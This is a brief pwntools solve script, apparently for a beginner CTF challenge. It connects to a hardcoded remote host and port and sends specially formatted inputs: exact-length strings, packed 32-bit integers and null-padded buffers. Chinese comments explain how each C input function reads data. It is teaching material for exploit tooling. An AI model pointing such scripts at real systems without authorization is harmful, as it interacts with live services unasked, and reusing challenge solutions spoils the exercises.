from pwn import *

context.log_level = 'info'

p = remote('110.42.112.160', 43307)

# Level 1: send() vs sendline()
p.send(b"ILovePwn")        # read 读满 8 字节，不带 \n
p.sendline(b"ILovePwn")    # fgets 需要 \n

# Level 2: p32() vs str()
p.sendline(b"1131796")     # scanf("%d") == 0x114514
p.send(b"y")               # 回答 getc(stdin)，吃掉 scanf 残留的 \n
p.send(p32(0x1919810))     # read 4 字节原始数据

# Level 3: \0 or not
p.send(b"ILovePwn")        # fgets(buf,9) 读满 8 字符，不带 \n
p.send(b"ILovePwn\x00\x00")# fread 读满 10 字节，手动补 \0
p.sendline(b"ILovePwn")    # scanf("%8s") 自动补 \0

p.interactive()